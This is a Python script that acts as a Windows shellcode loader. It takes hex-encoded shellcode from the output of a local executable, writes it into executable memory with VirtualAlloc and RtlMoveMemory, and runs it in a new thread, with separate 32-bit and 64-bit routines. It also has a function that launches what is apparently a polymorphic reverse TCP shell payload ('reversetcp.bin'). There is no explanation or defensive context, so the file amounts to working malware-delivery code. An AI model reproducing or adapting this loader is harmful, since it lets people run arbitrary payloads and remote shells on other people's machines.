import ctypes
import subprocess

# RUN SHELLCODE WINDOWS 32b & 64b

def get_shellcode():
    
    shellcodestr = "N"
    while(shellcodestr == "N"):
        shellcodestr = subprocess.check_output(["cmd", "/C", 'C:/Users/malwa/Desktop/Game/shpol.exe'], text=True)
        
    print("Popen:")
    print(shellcodestr)
    shellcodestr = shellcodestr.replace('\\x', ' ')
    return bytearray(bytes.fromhex(shellcodestr))


def runshell():
   
    shellcode = get_shellcode()
    
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                            ctypes.c_int(len(shellcode)),
                                            ctypes.c_int(0x3000),
                                            ctypes.c_int(0x40))
    
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                        buf,
                                        ctypes.c_int(len(shellcode)))
    
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                            ctypes.c_int(0),
                                            ctypes.c_int(ptr),
                                            ctypes.c_int(0),
                                            ctypes.c_int(0),
                                            ctypes.pointer(ctypes.c_int(0)))
    
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
    
def runshell_64():
    shellcode = get_shellcode()
    
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 

    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
    
def run_exec():
    subprocess.Popen(["cmd", "/C", "polymshell.exe ./reversetcp.bin"])
    
if __name__ == "__main__":
    runshell_64()
    